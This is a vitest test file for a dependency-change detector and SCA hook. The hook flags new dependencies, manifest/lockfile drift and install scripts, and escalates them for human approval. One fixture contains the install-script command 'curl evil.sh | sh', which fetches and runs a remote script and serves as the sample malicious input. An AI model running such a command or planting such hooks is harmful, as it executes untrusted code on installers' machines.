/**
 * DependencyChangeDetector + ScaHook — T-M7-005, spec §12.11 / §18.
 *
 * Locks the contracts:
 *   - new dep → dependency_added (high, needs human approval).
 *   - manifest without lockfile (or vice versa) → manifest_lockfile_drift (high).
 *   - new preinstall/postinstall script → critical_prepost_script (critical).
 *   - ScaHook.evaluateAndEscalate bumps RiskEscalationHook's floor.
 */

import { ProtectedFileDetector, RiskEscalationHook } from '@cgao/runner-broker';
import { describe, expect, it } from 'vitest';
import {
  detectDependencyChanges,
  type DependencyRiskFinding,
} from '../dependency-change-detector.js';
import { findingToDecision, ScaHook } from '../sca-hook.js';

function manifest(deps: Record<string, string>, scripts: Record<string, string> = {}): string {
  return JSON.stringify({ name: 'pkg', dependencies: deps, scripts });
}

describe('detectDependencyChanges (T-M7-005, spec §12.11 / §18)', () => {
  it('flags dependency_added when a new dep appears', () => {
    const base = new Map([['package.json', manifest({})]]);
    const head = new Map([['package.json', manifest({ lodash: '^4.0.0' })]]);
    const findings = detectDependencyChanges({
      changedFiles: ['package.json'],
      headTree: head,
      baseTree: base,
    });
    const added = findings.find((f) => f.kind === 'dependency_added');
    expect(added).toBeDefined();
    expect(added?.severity).toBe('high');
    expect(added?.packages).toContain('lodash');
  });

  it('flags dependency_removed when a dep disappears', () => {
    const base = new Map([['package.json', manifest({ lodash: '^4.0.0' })]]);
    const head = new Map([['package.json', manifest({})]]);
    const findings = detectDependencyChanges({
      changedFiles: ['package.json'],
      headTree: head,
      baseTree: base,
    });
    const removed = findings.find((f) => f.kind === 'dependency_removed');
    expect(removed).toBeDefined();
    expect(removed?.severity).toBe('medium');
  });

  it('flags manifest_lockfile_drift when package.json changes without a lockfile', () => {
    const base = new Map([['package.json', manifest({})]]);
    const head = new Map([['package.json', manifest({ lodash: '^4.0.0' })]]);
    const findings = detectDependencyChanges({
      changedFiles: ['package.json'],
      headTree: head,
      baseTree: base,
    });
    expect(findings.some((f) => f.kind === 'manifest_lockfile_drift')).toBe(true);
    expect(findings.some((f) => f.kind === 'manifest_or_lockfile_changed')).toBe(true);
  });

  it('flags manifest_lockfile_drift when a lockfile changes without package.json', () => {
    const base = new Map([['pnpm-lock.yaml', 'v1\n']]);
    const head = new Map([['pnpm-lock.yaml', 'v2\n']]);
    const findings = detectDependencyChanges({
      changedFiles: ['pnpm-lock.yaml'],
      headTree: head,
      baseTree: base,
    });
    expect(findings.some((f) => f.kind === 'manifest_lockfile_drift')).toBe(true);
  });

  it('does NOT flag drift when both manifest and lockfile change together', () => {
    const base = new Map([
      ['package.json', manifest({})],
      ['pnpm-lock.yaml', 'v1\n'],
    ]);
    const head = new Map([
      ['package.json', manifest({ lodash: '^4.0.0' })],
      ['pnpm-lock.yaml', 'v2\n'],
    ]);
    const findings = detectDependencyChanges({
      changedFiles: ['package.json', 'pnpm-lock.yaml'],
      headTree: head,
      baseTree: base,
    });
    expect(findings.some((f) => f.kind === 'manifest_lockfile_drift')).toBe(false);
    // Still high because deps were added.
    expect(findings.some((f) => f.kind === 'dependency_added')).toBe(true);
  });

  it('flags critical_prepost_script when a preinstall or postinstall script appears', () => {
    const base = new Map([['package.json', manifest({}, { build: 'tsc' })]]);
    const head = new Map([
      ['package.json', manifest({}, { build: 'tsc', preinstall: 'curl evil.sh | sh' })],
    ]);
    const findings = detectDependencyChanges({
      changedFiles: ['package.json'],
      headTree: head,
      baseTree: base,
    });
    const crit = findings.find((f) => f.kind === 'critical_prepost_script');
    expect(crit).toBeDefined();
    expect(crit?.severity).toBe('critical');
  });

  it('returns no findings for a clean patch that does not touch manifests', () => {
    const base = new Map([['src/a.ts', 'a']]);
    const head = new Map([['src/a.ts', 'b']]);
    const findings = detectDependencyChanges({
      changedFiles: ['src/a.ts'],
      headTree: head,
      baseTree: base,
    });
    expect(findings).toEqual([]);
  });
});

describe('ScaHook (T-M7-005)', () => {
  it('evaluate() maps findings to policy decisions', () => {
    const hook = new ScaHook();
    const r = hook.evaluate({
      changedFiles: ['package.json'],
      headTree: new Map([['package.json', manifest({ lodash: '^4.0.0' })]]),
      baseTree: new Map([['package.json', manifest({})]]),
    });
    expect(r.severityFloor).toBe('high');
    expect(r.requiresHumanApproval).toBe(true);
    expect(r.decisions.some((d) => d.code === 'dependency_added')).toBe(true);
  });

  it('findingToDecision marks critical findings as needsHumanApproval', () => {
    const decision = findingToDecision({
      kind: 'critical_prepost_script',
      severity: 'critical',
      detail: 'x',
    });
    expect(decision.needsHumanApproval).toBe(true);
  });

  it('evaluateAndEscalate bumps RiskEscalationHook severity floor', () => {
    // Set up an escalation hook with a fake classifier that records
    // the floor it was asked to enforce.
    let enforced: { severity: string } | null = null;
    const classifier = {
      enforceFloor(args: { deterministic: { severity: string } }) {
        enforced = { severity: args.deterministic.severity };
      },
    };
    const escalationHook = new RiskEscalationHook(
      new ProtectedFileDetector(),
      classifier as unknown as Parameters<typeof RiskEscalationHook>[1],
    );
    const scaHook = new ScaHook({ escalationHook });

    const r = scaHook.evaluateAndEscalate({
      changedFiles: ['package.json'],
      headTree: new Map([['package.json', manifest({ lodash: '^4.0.0' })]]),
      baseTree: new Map([['package.json', manifest({})]]),
      declared: [{ declaredSeverity: 'low' }],
      deterministic: { severity: 'low', matches: [] },
    });

    expect(r.severityFloor).toBe('high');
    expect(enforced).not.toBeNull();
    // Escalation hook bumps to ≥ high because of the SCA floor.
    expect(['high', 'critical']).toContain(enforced?.severity);
  });

  it('returns empty when no dependency files changed', () => {
    const hook = new ScaHook();
    const r = hook.evaluate({
      changedFiles: ['src/a.ts'],
      headTree: new Map([['src/a.ts', 'b']]),
      baseTree: new Map([['src/a.ts', 'a']]),
    });
    expect(r.decisions).toEqual([]);
    expect(r.severityFloor).toBeNull();
    expect(r.requiresHumanApproval).toBe(false);
  });
});
